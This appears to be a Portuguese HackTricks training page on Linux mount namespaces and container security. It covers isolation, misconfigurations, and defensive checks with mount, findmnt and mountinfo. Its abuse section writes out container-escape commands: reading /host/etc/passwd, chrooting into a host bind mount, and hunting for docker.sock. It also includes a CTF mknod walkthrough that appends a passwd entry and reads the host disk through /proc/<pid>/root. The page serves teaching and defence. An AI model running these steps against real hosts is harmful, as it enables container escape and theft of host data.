# Namespace de montagem

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de montagem controla a **tabela de montagem** que um processo vê. Esta é uma das funcionalidades de isolamento de container mais importantes porque o sistema de arquivos raiz, bind mounts, tmpfs mounts, a visão de procfs, a exposição de sysfs e muitas montagens auxiliares específicas do runtime são todas expressas através dessa tabela de montagem. Dois processos podem ambos acessar `/`, `/proc`, `/sys` ou `/tmp`, mas o que esses caminhos resolvem depende do namespace de montagem em que eles estão.

Do ponto de vista de segurança de containers, o namespace de montagem frequentemente é a diferença entre "isto é um sistema de arquivos de aplicação bem preparado" e "este processo pode ver ou influenciar diretamente o sistema de arquivos do host". É por isso que bind mounts, volumes `hostPath`, operações de montagem privilegiadas e exposições graváveis de `/proc` ou `/sys` giram em torno deste namespace.

## Operação

Quando um runtime lança um container, normalmente cria um namespace de montagem novo, prepara um sistema de arquivos raiz para o container, monta procfs e outros sistemas de arquivos auxiliares conforme necessário e então, opcionalmente, adiciona bind mounts, tmpfs mounts, secrets, config maps ou host paths. Uma vez que esse processo está rodando dentro do namespace, o conjunto de montagens que ele vê fica largamente desacoplado da visão padrão do host. O host ainda pode ver o sistema de arquivos subjacente real, mas o container vê a versão montada para ele pelo runtime.

Isso é poderoso porque permite que o container acredite que tem seu próprio sistema de arquivos raiz mesmo que o host ainda esteja gerenciando tudo. Também é perigoso porque, se o runtime expõe a montagem errada, o processo de repente ganha visibilidade sobre recursos do host que o restante do modelo de segurança pode não ter sido projetado para proteger.

## Laboratório

Você pode criar um namespace de montagem privado com:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagem, verá que a montagem tmpfs existe somente dentro do namespace de montagem isolado. Esse é um exercício útil porque mostra que o isolamento de montagem não é teoria abstrata; o kernel está literalmente apresentando uma tabela de montagem diferente para o processo.
Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagem, a montagem tmpfs existirá apenas dentro do namespace de montagem isolado.

Dentro de containers, uma comparação rápida é:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
O segundo exemplo demonstra como é fácil uma configuração em tempo de execução abrir um buraco enorme na fronteira do sistema de arquivos.

## Uso em tempo de execução

Docker, Podman, stacks baseados em containerd e CRI-O dependem todos de um mount namespace privado para containers normais. Kubernetes constrói sobre o mesmo mecanismo para volumes, projected secrets, config maps e montagens `hostPath`. Ambientes Incus/LXC também dependem fortemente de namespaces de montagem, especialmente porque system containers frequentemente expõem sistemas de arquivos mais ricos e com aparência de máquina do que application containers.

Isso significa que, quando você analisa um problema de sistema de arquivos de container, normalmente não está lidando com uma peculiaridade isolada do Docker. Você está olhando para um problema de mount-namespace e configuração em tempo de execução expresso pela plataforma que lançou a carga de trabalho.

## Configurações incorretas

O erro mais óbvio e perigoso é expor o host root filesystem ou outro caminho sensível do host através de um bind mount, por exemplo `-v /:/host` ou um writable `hostPath` no Kubernetes. Nesse ponto, a pergunta deixa de ser "o container consegue escapar de alguma forma?" e passa a ser "quanto conteúdo útil do host já está diretamente visível e gravável?" Um host bind mount gravável frequentemente transforma o resto do exploit em uma questão simples de colocação de arquivos, chrooting, modificação de configuração ou descoberta de sockets em runtime.

Outro problema comum é expor o host `/proc` ou `/sys` de maneiras que contornam a visão mais segura do container. Esses sistemas de arquivos não são montagens de dados ordinárias; são interfaces para o estado do kernel e dos processos. Se a carga de trabalho acessa as versões do host diretamente, muitas das suposições por trás do container hardening deixam de se aplicar de forma consistente.

Proteções read-only também importam. Um root filesystem read-only não protege magicamente um container, mas elimina grande parte do espaço de preparação do atacante e torna a persistência, a colocação de helper binaries e a adulteração de configuração mais difíceis. Ao contrário, um root gravável ou um host bind mount gravável dá ao atacante espaço para preparar o próximo passo.

## Abuso

Quando o mount namespace é mal utilizado, atacantes normalmente fazem uma de quatro coisas. Eles **leem dados do host** que deveriam ter permanecido fora do container. Eles **modificam a configuração do host** através de bind mounts graváveis. Eles **montam ou remontam recursos adicionais** se capabilities e seccomp permitirem. Ou eles **acessam sockets poderosos e diretórios de estado em runtime** que lhes permitem pedir mais acesso à própria plataforma de containers.

Se o container já consegue ver o sistema de arquivos do host, o resto do modelo de segurança muda imediatamente.

Quando você suspeita de um host bind mount, primeiro confirme o que está disponível e se é gravável:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se o host root filesystem estiver mounted read-write, o acesso direto ao host costuma ser tão simples quanto:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se o objetivo for acesso privilegiado em tempo de execução em vez de chrooting direto, enumere sockets e o estado de runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` estiver presente, teste também se novos mounts podem ser criados de dentro do container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemplo completo: Two-Shell `mknod` Pivot

Um vetor de abuso mais especializado aparece quando o usuário root do container pode criar block devices, o host e o container compartilham uma identidade de usuário de forma útil, e o atacante já tem um ponto de apoio com privilégios reduzidos no host. Nessa situação, o container pode criar um device node como `/dev/sda`, e o usuário do host com privilégios reduzidos pode depois lê-lo através de `/proc/<pid>/root/` para o processo correspondente do container.

Dentro do container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
No host, como o usuário correspondente com privilégios baixos, após localizar o PID do shell do container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
A lição importante não é a busca exata por strings do CTF. É que a exposição do mount-namespace através de `/proc/<pid>/root/` pode permitir que um usuário do host reutilize device nodes criados pelo container mesmo quando a política de devices do cgroup impedia o uso direto dentro do próprio container.

## Verificações

Estes comandos existem para mostrar a visão do filesystem em que o processo atual realmente está vivendo. O objetivo é detectar mounts provenientes do host, caminhos sensíveis graváveis e qualquer coisa que pareça mais ampla do que um normal container root filesystem de aplicação.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
O que é interessante aqui:

- Bind mounts do host, especialmente `/`, `/proc`, `/sys`, diretórios de estado em tempo de execução, ou localizações de socket, devem sobressair imediatamente.
- Montagens read-write inesperadas geralmente são mais importantes do que um grande número de montagens auxiliares read-only.
- `mountinfo` é frequentemente o melhor lugar para ver se um caminho é realmente derivado do host ou overlay-backed.

Essas verificações estabelecem **quais recursos estão visíveis neste namespace**, **quais são derivados do host**, e **quais deles são graváveis ou sensíveis em termos de segurança**.
{{#include ../../../../../banners/hacktricks-training.md}}
